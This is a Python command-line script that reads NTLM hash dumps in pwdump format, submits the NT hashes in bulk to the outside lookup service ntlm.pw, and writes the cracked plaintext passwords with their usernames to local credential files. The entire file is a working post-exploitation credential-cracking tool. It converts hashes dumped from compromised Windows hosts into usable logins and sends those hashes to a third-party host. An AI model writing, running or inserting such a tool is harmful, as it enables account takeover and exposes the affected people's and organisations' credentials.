#!/usr/bin/env python3
import re
import requests
import argparse
import sys


def crack_hashes(path, n):
	pattern = r'(.*):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::'

	# build hashes to crack
	users = []
	hashes = []
	with open(path) as fin:
		for idx, line in enumerate(fin, start=1):
			match = re.match(pattern, line.rstrip())
			users.append(match.group(1))
			hashes.append(match.group(2))

			if idx == n:
				break

	toCrack = "\n".join(hashes)

	response = requests.post('https://ntlm.pw/api/bulklookup', data=toCrack)

	r_text = response.text

	cracked = [c.split(':')[1] for c in r_text.split("\n")[:-1]]

	return dict(zip(users, cracked))

def main():
	parser = argparse.ArgumentParser(description="Use ntlm.pw to automatically convert hash dumps to credentials")
	parser.add_argument('file_path', help='Path to the file containing hash dumps')
	parser.add_argument('-s', '--separate-files', action='store_true', help='Output credentials in separate files')
	parser.add_argument('-n', type=int, help='Limit to the first n lines of the file')

	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)

	args = parser.parse_args()

	cracked = crack_hashes(args.file_path, args.n)

	if args.separate_files:
		userFile = open('users', 'w')
		passFile = open('passwords', 'w')
		for user, password in cracked.items():
			userFile.write(user + "\n")
			passFile.write(password + "\n")
		userFile.close()
		passFile.close()
	else:
		with open('credentials', 'w') as fout:
			for user, password in cracked.items():
				fout.write(user + ":" + password + "\n")

if __name__ == "__main__":
	main()
